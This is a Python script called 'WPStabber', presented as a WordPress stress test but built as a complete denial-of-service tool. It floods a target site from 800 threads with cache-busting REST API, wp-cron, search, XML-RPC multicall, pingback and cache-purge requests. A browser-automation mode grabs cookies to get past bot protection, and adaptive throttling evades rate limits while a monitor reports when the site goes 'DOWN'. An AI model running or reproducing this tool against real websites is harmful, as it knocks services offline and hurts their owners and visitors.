#!/usr/bin/env python3
"""
█     █░ ██▓███    ██████ ▄▄▄█████▓ ▄▄▄       ▄▄▄▄    ▄▄▄▄   ▓█████  ██▀███  
▓█░ █ ░█░▓██░  ██▒▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓█████▄ ▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
▒█░ █ ░█ ▓██░ ██▓▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒██▒ ▄██▒██▒ ▄██▒███   ▓██ ░▄█ ▒
░█░ █ ░█ ▒██▄█▓▒ ▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
░░██▒██▓ ▒██▒ ░  ░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██▓ ▒██▒
░ ▓░▒ ▒  ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒ ░ ░  ░▒ ░     ░ ░▒  ░ ░    ░      ▒   ▒▒ ░▒░▒   ░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
  ░   ░  ░░       ░  ░  ░    ░        ░   ▒    ░    ░  ░    ░    ░     ░░   ░ 
    ░                   ░                 ░  ░ ░       ░         ░  ░   ░     
                                                    ░       ░                 
                    WordPress Stress Test - Windows Edition
"""

import threading, time, sys, random, argparse, queue, string
import requests, urllib3
urllib3.disable_warnings()

TOTAL_THREADS = 800
SEARCH_TERMS = ["smartphone", "review", "test", "best", "price", "compare", "android", "iphone"]
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
XMLRPC_LISTMETHODS = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
XMLRPC_PINGBACK = '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>{callback}</string></value></param><param><value><string>{target}</string></value></param></params></methodCall>'
XMLRPC_MULTICALL = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>{calls}</data></array></value></param></params></methodCall>'

if sys.platform == 'win32':
    import os
    os.system('color')

R, G, Y, C, B, M, X = '\033[91m', '\033[92m', '\033[93m', '\033[96m', '\033[1m', '\033[95m', '\033[0m'


class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.requests = 0
        self.running = True
        self.vector_stats = {}
        self.throttle = 0.0  # Adaptive delay
    
    def inc(self, n=1):
        with self.lock:
            self.requests += n
    
    def inc_vector(self, v):
        with self.lock:
            self.vector_stats[v] = self.vector_stats.get(v, 0) + 1
    
    def set_throttle(self, t):
        with self.lock:
            self.throttle = t
    
    def get_throttle(self):
        with self.lock:
            return self.throttle


stats = Stats()
health_queue = queue.Queue()


def get_session(cookies, ua):
    s = requests.Session()
    s.headers.update({"User-Agent": ua, "Accept": "*/*", "Connection": "keep-alive"})
    for k, v in cookies.items():
        s.cookies.set(k, v)
    a = requests.adapters.HTTPAdapter(pool_connections=200, pool_maxsize=200, max_retries=0)
    s.mount('https://', a)
    s.mount('http://', a)
    return s


def probe_vectors(session, target):
    print(f"{Y}[*] Probing vectors...{X}")
    available = {}
    vectors = {
        'wp_cron': f"{target}/wp-cron.php", 'rest_posts': f"{target}/wp-json/wp/v2/posts",
        'rest_pages': f"{target}/wp-json/wp/v2/pages", 'rest_media': f"{target}/wp-json/wp/v2/media",
        'rest_users': f"{target}/wp-json/wp/v2/users", 'rest_comments': f"{target}/wp-json/wp/v2/comments",
        'xmlrpc': f"{target}/xmlrpc.php", 'admin_ajax': f"{target}/wp-admin/admin-ajax.php",
        'search': f"{target}/?s=test", 'feed': f"{target}/feed/",
        'litespeed': f"{target}/?LSCWP_CTRL=purge", 'nginx': f"{target}/purge/", 'apache': f"{target}/.htaccess"
    }
    for name, url in vectors.items():
        try:
            if name == 'xmlrpc':
                r = session.post(url, data=XMLRPC_LISTMETHODS, headers={'Content-Type': 'text/xml'}, timeout=10, verify=False)
            elif name == 'admin_ajax':
                r = session.post(url, data={'action': 'heartbeat'}, timeout=10, verify=False)
            else:
                r = session.get(url, timeout=10, verify=False)
            available[name] = r.status_code in [200, 405, 500]
            print(f"    {name:<15} {G+'✓'+X if available[name] else R+'✗'+X}")
        except:
            available[name] = False
            print(f"    {name:<15} {R}✗{X}")
    print(f"\n{G}[+] {sum(available.values())}/{len(vectors)} available{X}\n")
    return available


def gen_multicall(n=20):
    c = '<value><struct><member><n>methodName</n><value><string>wp.getUsersBlogs</string></value></member></struct></value>'
    return XMLRPC_MULTICALL.format(calls=c*n)


def health_monitor(cookies, ua, target):
    while stats.running:
        s = get_session(cookies, ua)
        try:
            t0 = time.time()
            r = s.get(target, timeout=60, verify=False)
            ht = time.time() - t0
            t0 = time.time()
            r2 = s.get(f"{target}/wp-json/", timeout=60, verify=False)
            at = time.time() - t0
            health_queue.put({"home": ht, "api": at, "home_status": r.status_code, "api_status": r2.status_code})
        except:
            health_queue.put({"home": 60, "api": 60, "home_status": 0, "api_status": 0})
        time.sleep(2)


def attacker(tid, cookies, ua, target, avail, adaptive):
    s = get_session(cookies, ua)
    vecs = []
    if avail.get('rest_posts'): vecs += ['rp'] * 4
    if avail.get('rest_pages'): vecs += ['rpg'] * 4
    if avail.get('rest_media'): vecs += ['rm'] * 2
    if avail.get('wp_cron'): vecs += ['wc'] * 3
    if avail.get('search'): vecs += ['s'] * 3 + ['sl'] * 2
    if avail.get('admin_ajax'): vecs += ['aa'] * 2
    if avail.get('rest_users'): vecs += ['ru'] * 2
    if avail.get('xmlrpc'): vecs += ['xm'] * 2 + ['xp']
    if avail.get('feed'): vecs += ['f']
    if avail.get('litespeed'): vecs += ['ls']
    if avail.get('nginx'): vecs += ['ng']
    if avail.get('apache'): vecs += ['ap']
    if not vecs: vecs = ['s']
    
    while stats.running:
        # Adaptive throttling
        if adaptive:
            delay = stats.get_throttle()
            if delay > 0:
                time.sleep(delay)
        
        try:
            v, ts = random.choice(vecs), time.time_ns()
            if v == 'rp': s.get(f"{target}/wp-json/wp/v2/posts?_embed&per_page=100&_={ts}", timeout=120, verify=False)
            elif v == 'rpg': s.get(f"{target}/wp-json/wp/v2/pages?_embed&per_page=100&_={ts}", timeout=120, verify=False)
            elif v == 'rm': s.get(f"{target}/wp-json/wp/v2/media?per_page=100&_={ts}", timeout=120, verify=False)
            elif v == 'wc': s.get(f"{target}/wp-cron.php?doing_wp_cron={ts}", timeout=120, verify=False)
            elif v == 's': s.get(f"{target}/?s={random.choice(SEARCH_TERMS)}+{random.randint(1000,9999)}&_={ts}", timeout=120, verify=False)
            elif v == 'sl': s.get(f"{target}/?s={''.join(random.choices(string.ascii_lowercase,k=80))}&_={ts}", timeout=120, verify=False)
            elif v == 'aa': s.post(f"{target}/wp-admin/admin-ajax.php", data={'action': 'heartbeat'}, timeout=120, verify=False)
            elif v == 'ru': s.get(f"{target}/wp-json/wp/v2/users?per_page=100&_={ts}", timeout=120, verify=False)
            elif v == 'xm': s.post(f"{target}/xmlrpc.php", data=gen_multicall(50), headers={'Content-Type': 'text/xml'}, timeout=120, verify=False)
            elif v == 'xp': s.post(f"{target}/xmlrpc.php", data=XMLRPC_PINGBACK.format(callback=f"http://127.0.0.1/{ts}", target=target), headers={'Content-Type': 'text/xml'}, timeout=120, verify=False)
            elif v == 'f': s.get(f"{target}/feed/?_={ts}", timeout=120, verify=False)
            elif v == 'ls': s.get(f"{target}/?LSCWP_CTRL=purge&_={ts}", timeout=120, verify=False)
            elif v == 'ng': s.get(f"{target}/purge/*", timeout=120, verify=False, headers={'X-Purge-Method': 'regex'}); s.request('PURGE', f"{target}/?_={ts}", timeout=120, verify=False)
            elif v == 'ap': s.get(f"{target}/?nocache={ts}", timeout=120, verify=False, headers={'Cache-Control': 'no-cache', 'Pragma': 'no-cache'})
            stats.inc()
            stats.inc_vector(v)
        except:
            stats.inc()


def main():
    global TOTAL_THREADS, SEARCH_TERMS, USER_AGENT
    
    p = argparse.ArgumentParser(description="WPStabber - WordPress Stress Test (Windows)")
    p.add_argument("--target", "-t", required=True)
    p.add_argument("--cookies", "-c")
    p.add_argument("--ua")
    p.add_argument("--bypass", action="store_true")
    p.add_argument("--no-cookies", action="store_true")
    p.add_argument("--threads", "-T", type=int, default=TOTAL_THREADS)
    p.add_argument("--duration", "-d", type=int, default=0)
    p.add_argument("--search-file")
    p.add_argument("--adaptive", "-a", action="store_true", help="Auto-throttle on rate limit, scales up/down")
    args = p.parse_args()
    
    target = args.target.rstrip("/")
    TOTAL_THREADS = args.threads
    adaptive = args.adaptive
    
    if args.ua: USER_AGENT = args.ua
    if args.search_file:
        try:
            with open(args.search_file, 'r', encoding='utf-8') as f:
                SEARCH_TERMS = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        except: pass
    
    mode = "BYPASS" if args.bypass else "RAW" if args.no_cookies else "NORMAL"
    if adaptive: mode += " + ADAPTIVE"
    
    print(f"""{R}
█     █░ ██▓███    ██████ ▄▄▄█████▓ ▄▄▄       ▄▄▄▄    ▄▄▄▄   ▓█████  ██▀███  
▓█░ █ ░█░▓██░  ██▒▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓█████▄ ▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
▒█░ █ ░█ ▓██░ ██▓▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒██▒ ▄██▒██▒ ▄██▒███   ▓██ ░▄█ ▒
░█░ █ ░█ ▒██▄█▓▒ ▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
░░██▒██▓ ▒██▒ ░  ░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██▓ ▒██▒
░ ▓░▒ ▒  ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒ ░ ░  ░▒ ░     ░ ░▒  ░ ░    ░      ▒   ▒▒ ░▒░▒   ░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
  ░   ░  ░░       ░  ░  ░    ░        ░   ▒    ░    ░  ░    ░    ░     ░░   ░ 
    ░                   ░                 ░  ░ ░       ░         ░  ░   ░     
                                                    ░       ░                 
{X}
{B}Mode:{X}     {mode}
{B}Target:{X}   {target}
{B}Threads:{X}  {TOTAL_THREADS}
""")

    # Cookie setup
    cookies = {}
    if args.bypass:
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.service import Service
            from webdriver_manager.chrome import ChromeDriverManager
            print(f"{Y}[*] Starting Chrome...{X}")
            opts = webdriver.ChromeOptions()
            opts.add_argument("--disable-blink-features=AutomationControlled")
            driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
            driver.get(target)
            input(f"\n{G}>>> Press ENTER after page loads...{X}")
            cookies = {c['name']: c['value'] for c in driver.get_cookies()}
            USER_AGENT = driver.execute_script("return navigator.userAgent")
            print(f"{G}[+] Got cookies{X}\n")
        except Exception as e:
            print(f"{R}[-] Browser error: {e}{X}")
            sys.exit(1)
    elif args.no_cookies:
        cookies = {}
    else:
        if not args.cookies:
            print(f"{R}[-] Need --cookies, --bypass or --no-cookies{X}")
            sys.exit(1)
        for item in args.cookies.replace('\n', ';').split(';'):
            if '=' in item:
                k, v = item.split('=', 1)
                cookies[k.strip()] = v.strip()
    
    # Verify
    session = get_session(cookies, USER_AGENT)
    try:
        r = session.get(target, timeout=30, verify=False)
        print(f"{G}[+] Connection OK ({r.status_code}){X}\n")
    except Exception as e:
        print(f"{R}[-] Failed: {e}{X}")
    
    avail = probe_vectors(session, target)
    
    # Baseline
    print(f"{Y}[*] Baseline...{X}")
    times = []
    for _ in range(5):
        try:
            t0 = time.time()
            session.get(target, timeout=30, verify=False)
            times.append(time.time() - t0)
        except: pass
    baseline = sum(times) / len(times) if times else 0.5
    print(f"{G}[+] Baseline: {baseline:.3f}s{X}\n")
    
    input(f"{R}Press ENTER to attack...{X}")
    print(f"\n{R}{'='*65}\n           LAUNCHING {TOTAL_THREADS} ATTACKERS\n{'='*65}{X}\n")
    
    t0 = time.time()
    threading.Thread(target=health_monitor, args=(cookies, USER_AGENT, target), daemon=True).start()
    
    for i in range(TOTAL_THREADS):
        threading.Thread(target=attacker, args=(i, cookies, USER_AGENT, target, avail, adaptive), daemon=True).start()
        if (i + 1) % 100 == 0:
            sys.stdout.write(f"\r{R}[*] Launched {i+1}/{TOTAL_THREADS}{X}")
            sys.stdout.flush()
    
    print(f"\n{R}[!] {TOTAL_THREADS} ACTIVE{X}\n")
    print(f"{B}{'Time':>5} {'Reqs':>9} {'RPS':>7} | Home       API       | Impact{X}")
    print("─" * 70)
    
    last, health, peak = 0, {"home": baseline, "api": baseline, "home_status": 200, "api_status": 200}, baseline
    was_rl = False
    
    try:
        while True:
            if args.duration and time.time() - t0 >= args.duration:
                break
            time.sleep(1)
            
            while not health_queue.empty():
                try:
                    health = health_queue.get_nowait()
                except:
                    break
            
            cur, rps = stats.requests, stats.requests - last
            last = cur
            el = time.time() - t0
            ht, at = health.get("home", 0), health.get("api", 0)
            hs, as_ = health.get("home_status", 200), health.get("api_status", 200)
            if ht > peak: peak = ht
            deg = ((ht - baseline) / baseline * 100) if baseline > 0 else 0
            
            # Rate limit detection
            is_rl = hs in [429, 529]
            lifted = was_rl and not is_rl and hs in [200, 500, 502, 503]
            was_rl = is_rl
            
            # Adaptive throttling
            thr = stats.get_throttle()
            if adaptive:
                if is_rl:
                    # BACKOFF: increase delay up to 5s max
                    new_thr = min(thr + 0.5, 5.0)
                    stats.set_throttle(new_thr)
                elif lifted or hs in [200, 500, 502, 503]:
                    # RAMP UP: decrease delay slowly
                    if thr > 0:
                        new_thr = max(thr - 0.1, 0.0)
                        stats.set_throttle(new_thr)
                thr = stats.get_throttle()
            
            # Throttle indicator
            thr_str = f" 📉{thr:.1f}s" if thr > 0 else ""
            
            if hs in [0, 502] or ht >= 30:
                imp = f"{R}☠️  DOWN{X}"
            elif hs == 403:
                imp = f"{M}🛡️  BLOCKED{X}"
            elif hs == 429:
                imp = f"{M}⏱️  429 RATE LIMITED{thr_str}{X}"
            elif hs == 529:
                imp = f"{R}🔥 CF ERROR 1015{thr_str}{X}"
            elif lifted:
                imp = f"{G}✓ RATE LIMIT LIFTED{X}"
            elif deg > 500:
                imp = f"{R}☢️  NUCLEAR +{deg:.0f}%{X}"
            elif deg > 200:
                imp = f"{R}🔥 SEVERE +{deg:.0f}%{X}"
            elif deg > 100:
                imp = f"{Y}⚠️  DEGRADED +{deg:.0f}%{X}"
            elif deg > 50:
                imp = f"{Y}STRESSED +{deg:.0f}%{X}"
            else:
                imp = f"{G}HOLDING +{deg:.0f}%{X}"
            
            hc = R if deg > 100 else Y if deg > 50 else G
            ac = R if as_ != 200 else G
            sys.stdout.write(f"\r{' '*75}\r")
            sys.stdout.write(f"{el:4.0f}s {cur:>9,} {rps:>7,} | {hc}{ht:>6.2f}s{X}({hs}) {ac}{at:>6.2f}s{X}({as_}) | {imp}")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print(f"\n\n{Y}[*] Stopping...{X}")
    
    stats.running = False
    time.sleep(1)
    
    dur = time.time() - t0
    total, rps_avg = stats.requests, stats.requests / dur if dur > 0 else 0
    pdeg = ((peak - baseline) / baseline * 100) if baseline > 0 else 0
    
    print(f"""

{R}
    ╔╗ ╦  ╔═╗╔═╗╔╦╗  ╦═╗╔═╗╔═╗╦ ╦╦ ╔╦╗╔═╗
    ╠╩╗║  ║ ║║ ║ ║║  ╠╦╝║╣ ╚═╗║ ║║  ║ ╚═╗
    ╚═╝╩═╝╚═╝╚═╝═╩╝  ╩╚═╚═╝╚═╝╚═╝╩═╝╩ ╚═╝
{X}
{B}Duration:{X}    {dur:.1f}s
{B}Requests:{X}    {total:,}
{B}Avg RPS:{X}     {rps_avg:,.0f}
{B}Baseline:{X}    {baseline:.3f}s
{B}Peak:{X}        {peak:.3f}s
{B}Degradation:{X} {R}+{pdeg:.0f}%{X}

{C}Vector Breakdown:{X}""")
    
    for v, c in sorted(stats.vector_stats.items(), key=lambda x: x[1], reverse=True):
        print(f"  {v:<10} {c:>10,}")
    
    print(f"\n{R}{'='*65}{X}\n")


if __name__ == "__main__":
    main()
